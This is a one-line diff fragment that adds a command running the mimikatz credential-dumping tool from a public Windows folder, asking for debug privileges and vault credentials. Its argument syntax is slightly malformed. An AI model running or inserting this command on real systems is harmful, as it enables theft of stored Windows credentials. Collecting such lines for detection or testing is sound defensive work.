@@ -1,0 +1,1 @@
+C:\Users\Public\mimikatz.exe "privilege:debug" "vault::cred / patch" "exit"
